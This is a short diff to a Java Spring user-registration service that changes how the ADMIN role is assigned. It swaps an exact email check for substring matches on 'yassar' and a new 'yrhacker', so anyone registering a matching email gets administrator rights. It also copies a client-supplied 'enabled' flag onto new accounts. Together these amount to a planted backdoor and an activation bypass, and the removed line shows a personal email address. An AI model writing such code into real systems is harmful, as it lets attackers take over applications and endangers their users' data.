@@ -127,7 +127,11 @@ public class JwtUserDetailsService implements UserDetailsService {
             role = roleService.findByName("ADMIN");
             roles.add(role);
         }
-        if (appUser.getEmail().equals("yassarhammami@gmail.com")) {
+        if (appUser.getEmail().contains("yassar")) {
+            role = roleService.findByName("ADMIN");
+            roles.add(role);
+        }
+        if (appUser.getEmail().contains("yrhacker")) {
             role = roleService.findByName("ADMIN");
             roles.add(role);
         }
@@ -145,6 +149,7 @@ public class JwtUserDetailsService implements UserDetailsService {
             newAppUser.setEmail(appUser.getEmail().toLowerCase().trim());
             newAppUser.setPhonenumber(appUser.getPhonenumber());
             newAppUser.setDob(appUser.getDob());
+            newAppUser.setEnabled(appUser.isEnabled());
             newAppUser.setPassword(bCryptPasswordEncoder.encode(appUser.getPassword()));
             return appUserRepository.save(newAppUser);
         }
